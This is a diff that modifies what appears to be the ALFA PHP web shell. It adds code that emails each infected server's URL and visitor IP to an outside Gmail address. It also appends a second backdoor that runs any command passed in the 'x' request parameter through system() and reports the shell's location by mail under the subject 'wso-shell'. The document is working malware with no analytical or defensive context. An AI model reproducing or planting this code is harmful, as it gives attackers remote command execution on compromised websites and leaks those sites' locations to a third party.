@@ -179,7 +179,7 @@ if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'
 define("__ALFA_VERSION__", "4.1");
 define("__ALFA_UPDATE__", "2");
 define("__ALFA_CODE_NAME__", "Tesla");
-define("__ALFA_DATA_FOLDER__", "ALFA_DATA");
+define("__ALFA_DATA_FOLDER__", "AZZ_DATA");
 define("__ALFA_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
 define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__?_AlfaSecretKey():'');
 $GLOBALS['__ALFA_COLOR__'] = array(
@@ -515,6 +515,14 @@ $config = array('AlfaUser' => $GLOBALS['DB_NAME']['user'],'AlfaPass' => $GLOBALS
 @ignore_user_abort(true);
 @set_time_limit(0);
 @ini_set('memory_limit', '-1');
+@error_reporting(0);
+@ini_set('display_errors', FALSE);
+@ini_set('max_execution_time', 5000);
+header('Content-Type: text/html; charset=UTF-8');
+$to = 'rootcyberpunks@gmail.com';
+$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($to, "Result Logger Mu | 0x4u", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 @ini_set("upload_max_filesize", "9999m");
 if($config['AlfaProtectShell']){
 $SERVER_SIG = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");
@@ -6511,4 +6519,20 @@ exit;
 #skype : sole.sad
 #skype : hackerman1337.invisible
 */
+?>
+<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+if(isset($_REQUEST['x'])){
+$el=$_REQUEST['x'];
+system($el);
+
+}
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'rootcyberpunks@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "wso-shell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
